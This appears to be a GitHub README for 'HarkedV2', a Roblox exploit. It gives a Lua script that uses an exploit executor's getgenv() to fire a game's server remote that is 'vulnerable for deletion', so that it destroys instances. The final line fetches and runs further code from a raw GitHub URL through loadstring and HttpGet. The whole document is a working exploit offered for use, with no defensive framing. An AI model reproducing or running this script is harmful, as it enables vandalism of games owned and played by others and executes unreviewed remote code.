# HarkedV2
Fixed version of 'Harked' by Harkinian. Made the ability to customize the deletion remote.

To run, edit the following script accordingly, and then execute:
```lua
local function Destroy(a: Instance)
    local _G = getgenv()

    local args = { -- Change the arguments depending on how the remote works.
        [1] = "Destroy",
        [2] = a
    }
    
    if _G.rem:IsA("RemoteEvent") then
        _G.rem:FireServer(unpack(args))
    elseif _G.rem:IsA("RemoteFunction") then
        _G.rem:InvokeServer(unpack(args))
    elseif _G.rem:IsA("UnreliableRemoteEvent") then
        _G.rem:FireServer(unpack(args))
    end
end

getgenv().rem = game.ReplicatedStorage.Remotes["DeleteRemoteExample"] -- Change this to whatever remote is vulnerable for deletion
getgenv().Destroy = Destroy

loadstring(game:HttpGet("https://raw.githubusercontent.com/qtip-rbxl/HarkedV2/main/main.lua", true))()
```
